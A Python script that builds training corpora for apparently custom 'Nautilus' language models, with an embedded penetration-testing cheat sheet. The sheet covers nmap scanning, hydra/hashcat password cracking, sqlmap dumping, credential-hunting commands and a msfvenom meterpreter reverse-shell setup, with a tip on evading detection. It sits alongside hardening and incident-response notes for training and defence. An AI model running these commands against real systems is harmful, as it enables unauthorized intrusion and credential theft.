"""Nautilus LM — corpus builders for the four custom models.

  coding : the entire Nautilus OS source + general Python reference
  writing: markdown / README / docs writing samples + repo docs
  pentest: authored cybersecurity knowledge corpus (tools, OWASP, hardening)

Run:  python3 models/lm/make_corpora.py [--force]
Output written to models/data/<id>/*.txt
"""

import argparse
import os

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DATA = os.path.join(ROOT, "models", "data")

SKIP_DIRS = {".git", "__pycache__", "node_modules", ".venv", "venv", "trained", "data"}
CODE_EXTS = (".py", ".md", ".json", ".sh", ".qss", ".css", ".toml", ".txt")
DOC_EXTS = (".md", ".txt")


def walk(root: str, exts=CODE_EXTS):
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
        for fn in sorted(filenames):
            if fn.endswith(exts):
                yield os.path.join(dirpath, fn)


def build_coding():
    chunks = []
    total = 0
    for path in walk(ROOT, CODE_EXTS):
        try:
            with open(path, encoding="utf-8", errors="replace") as f:
                text = f.read()
        except OSError:
            continue
        rel = os.path.relpath(path, ROOT)
        if "models/data" in rel or rel.startswith("models/trained"):
            continue
        chunks.append(f"# FILE: {rel}\n{text}")
        total += len(text)
    chunks.append(PYTHON_REFERENCE)
    body = "\n\n".join(chunks)
    out = os.path.join(DATA, "coding")
    os.makedirs(out, exist_ok=True)
    with open(os.path.join(out, "corpus.txt"), "w", encoding="utf-8") as f:
        f.write(body)
    print(f"coding corpus: {len(body):,} chars ({total:,} from repo)")


def build_writing():
    chunks = []
    for path in walk(ROOT, DOC_EXTS):
        try:
            with open(path, encoding="utf-8", errors="replace") as f:
                text = f.read()
        except OSError:
            continue
        rel = os.path.relpath(path, ROOT)
        if "models/data" in rel or rel.startswith("models/trained"):
            continue
        chunks.append(text)
    chunks.append(WRITING_TEMPLATES)
    body = "\n\n".join(chunks)
    out = os.path.join(DATA, "writing")
    os.makedirs(out, exist_ok=True)
    with open(os.path.join(out, "corpus.txt"), "w", encoding="utf-8") as f:
        f.write(body)
    print(f"writing corpus: {len(body):,} chars")


def build_pentest():
    out = os.path.join(DATA, "pentest")
    os.makedirs(out, exist_ok=True)
    with open(os.path.join(out, "corpus.txt"), "w", encoding="utf-8") as f:
        f.write(PENTEST_CORPUS)
    print(f"pentest corpus: {len(PENTEST_CORPUS):,} chars")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--force", action="store_true")
    ap.parse_args()
    build_coding()
    build_writing()
    build_pentest()


PYTHON_REFERENCE = r"""
# Python reference
def foo(a, b=1, *args, **kwargs):
    return a + b

class Base:
    def __init__(self, name):
        self.name = name

    def describe(self):
        return f"{self.name}"

try:
    raise ValueError("bad")
except ValueError as e:
    print(e)
finally:
    pass

with open("f.txt", "r") as fh:
    data = fh.read()

import os, sys, json
for i in range(10):
    print(i)

items = [x * 2 for x in range(5) if x % 2 == 0]
mapping = {k: v for k, v in zip("ab", [1, 2])}

def cli():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()
    if args.verbose:
        print("verbose")
"""

WRITING_TEMPLATES = r"""
# {Project} Readme
## Overview
A short paragraph describing what the project is and why it exists.

## Features
- Feature one
- Feature two

## Install
    pip install {project}

## Usage
```python
import {project}
```

## License
MIT
"""

PENTEST_CORPUS = r"""
# Cyber Security Knowledge Base (Nautilus Pentest Model)
# Reconnaissance
Recon is the first phase. Passive recon gathers info without touching the target.
Useful passive sources: search engines, DNS lookups, certificate transparency logs, WHOIS.
Active recon touches the target: port scans, service enumeration, banner grabbing.
Use nmap for scanning. Always start broad, then focus.

# nmap reference
nmap -sV 10.0.0.1            # service version detection
nmap -sS 10.0.0.0/24         # stealth TCP SYN scan (needs root)
nmap -sC 10.0.0.1            # default safe scripts
nmap -p- 10.0.0.1            # all 65535 ports
nmap -sV -p 22,80,443 --script vuln 10.0.0.1
nmap -A 10.0.0.1             # aggressive: OS + version + scripts
nmap -sn 10.0.0.0/24         # ping sweep, host discovery
nmap -O 10.0.0.1             # OS fingerprint
nmap -oN scan.txt 10.0.0.1   # normal output to file
Common nmap ports: 21 ftp, 22 ssh, 23 telnet, 25 smtp, 53 dns, 80 http,
110 pop3, 143 imap, 443 https, 445 smb, 3306 mysql, 5432 postgres, 6379 redis,
27017 mongodb, 8080 proxy, 5900 vnc, 3389 rdp.

# service enumeration
ssh: nc -nv 10.0.0.1 22; ssh -v user@host
web: curl -I http://10.0.0.1; whatweb http://10.0.0.1
http title + headers with curl: curl -s http://10.0.0.1 | head
banner grab: nc -vn 10.0.0.1 80; timeout 5 bash -c 'echo | openssl s_client -connect host:443'
smb: smbclient -L //10.0.0.1; nmap --script smb-enum-shares
ftp: ftp 10.0.0.1; use anonymous login attempts
dns: dig @10.0.0.1 domain; host -t AXFR domain 10.0.0.1 (zone transfer)
smtp: telnet host 25; VRFY root

# web application testing
Always check robots.txt and sitemap.xml.
Check HTTP methods with OPTIONS; block PUT/DELETE unless needed.
OWASP Top 10 2021: A01 Broken Access Control, A02 Cryptographic Failures,
A03 Injection, A04 Insecure Design, A05 Security Misconfiguration,
A06 Vulnerable and Outdated Components, A07 Identification and Authentication
Failures, A08 Software and Data Integrity Failures, A09 Security Logging and
Monitoring Failures, A10 Server-Side Request Forgery (SSRF).
SQLi: test with single quote ' in inputs; use parameterized queries to fix.
XSS: reflect user input with <script>alert(1)</script>; sanitize output.
CSRF: validate origin/referer and use CSRF tokens on state-changing requests.
Auth: test default credentials, weak passwords, session fixation, JWT alg=none.
JWT: check signature algorithm confusion and expired tokens.
SSRF: server fetches URLs; restrict to allowlists, block localhost/metadata IPs.
Use curl to fuzz: curl -X POST -d 'user=admin' http://host/login
Check response headers: curl -sI http://host
Security headers to set: X-Content-Type-Options: nosniff, X-Frame-Options: DENY,
Content-Security-Policy, Strict-Transport-Security, Referrer-Policy.
Directory brute force: gobuster dir -u http://host -w wordlist.txt
gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt -t 50
ffuf -u http://host/FUZZ -w wordlist.txt
Nikto web scanner: nikto -h http://10.0.0.1
SQLi scanner: sqlmap -u 'http://host/item.php?id=1' --dbs
sqlmap -r request.txt --batch --dump

# credential attacks
hydra -l admin -P passwords.txt ssh://10.0.0.1
hydra -l root -P words.txt -t 4 -f 10.0.0.1 ssh
hydra -L users.txt -P pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
hashcat -m 0 hash.txt rockyou.txt   # MD5
hashcat -m 1000 hash.txt rockyou.txt # NTLM
Default credentials are always worth trying: admin/admin, root/root, pi/raspberry.
Always rate-limit brute force to avoid lockouts; use -t to control threads.

# privilege escalation (linux)
sudo -l                     # list sudo permissions
id; whoami; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null   # setuid binaries
crontab -l; cat /etc/crontab; ls -la /var/spool/cron
env | grep -i pass        # environment secrets
cat /etc/shadow (only readable by root)
history; ls -la /root; find / -name '*.bak' -o -name '*pass*' 2>/dev/null
Kernel exploits are last resort; prefer misconfigurations.
Check writable files: find / -writable -type f 2>/dev/null | grep -v proc
Check PATH hijack: echo $PATH; look for writable dirs in PATH.

# metasploit
msfconsole
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f elf -o shell.elf
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.2
set LPORT 4444
exploit
In meterpreter: sysinfo, getuid, shell, upload, download, hashdump.
Always use encrypted reverse shells over the internet to avoid detection.

# pivoting and tunneling
ssh -L local_port:target_host:target_port user@jumphost
ssh -D 1080 user@jumphost       # SOCKS proxy
proxychains nmap -sT -Pn 10.0.1.1
chisel client -R 8000:socks server

# linux hardening
Disable root login over SSH: PermitRootLogin no.
Use key-based auth only: PasswordAuthentication no.
Fail2ban for SSH brute force protection.
Keep the system patched: apt update && apt upgrade.
Remove unused services: systemctl list-unit-files | grep enabled.
Firewall: default deny inbound, allow only needed ports.
ufw default deny; ufw allow 22/tcp; ufw enable
nftables/iptables examples:
iptables -A INPUT -p tcp --dport 22 -s 192.168.0.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP
File permissions: regular files 644, executables 755, secrets 600.
Configs: 600 for /etc/ssh/ssh_host_*_key, shadow is 640 root:shadow.
Set file umask 027. Harden sysctl: net.ipv4.tcp_syncookies=1,
kernel.randomize_va_space=2, net.ipv4.conf.all.rp_filter=1.
Disable core dumps; set PasswordAuthentication no; disable ICMP redirects.
Check listening ports: ss -tulpn; netstat -tulpn.
Check open files: lsof -i. Monitor logs in /var/log/auth.log.

# cryptography
Hashing (one-way): SHA-256, bcrypt, argon2 for passwords. Use salts.
Encryption: AES-256-GCM for data at rest; TLS 1.2+ for transit.
Do not roll your own crypto. Use vetted libraries.
Check TLS: openssl s_client -connect host:443 -brief
Weak configs: SSLv3, TLS1.0/1.1, RC4, DES, MD5 signatures, small DH keys.
Password storage: never plaintext; use Argon2id/bcrypt with work factor.

# incident response
1) Preserve evidence: image disks, copy logs, note times.
2) Identify scope: what was accessed, from where, for how long.
3) Contain: isolate host, rotate credentials, block IOCs.
4) Eradicate: remove malware, patch the hole.
5) Recover: restore from clean backups, verify integrity.
6) Lessons learned: document, update monitoring.
Key artifacts: auth.log, bash history, /var/log/syslog, connections, cron, tmp.

# networking
tcpdump -i eth0 port 80 -w capture.pcap
tcpdump -i eth0 -n -s 0
DNS tunneling / exfil detection: watch for large TXT record queries.
Wireshark for deep protocol analysis.
Check ARP for spoofing; use arpwatch.

# reverse engineering basics
file binary; strings binary | grep -i pass
objdump -d binary | head
Check SUID binaries for known vulnerable versions.

# password cracking notes
wordlists: /usr/share/wordlists/rockyou.txt
Rules with hashcat: -r rules/best64.rule
GPU accelerates bcrypt/WPA cracking massively.
Always capture the hash format type (see hashcat --example-hashes).

# osint
Whois: whois domain
DNS: dig any domain; use subdomain enumeration: sublist3r, amass.
Certificate transparency: crt.sh search by domain.
Check leaked creds with public breach aggregators (ethically).
Google dorks: site:domain.com filetype:pdf, "password" filetype:env.

# report writing
Every engagement ends with a report: executive summary, scope, timeline,
findings ranked by severity (Critical/High/Medium/Low/Info), evidence,
remediation steps. Severity from CVSS where applicable.
Remediation before disclosure. Never publish sensitive findings publicly.
"""

if __name__ == "__main__":
    main()
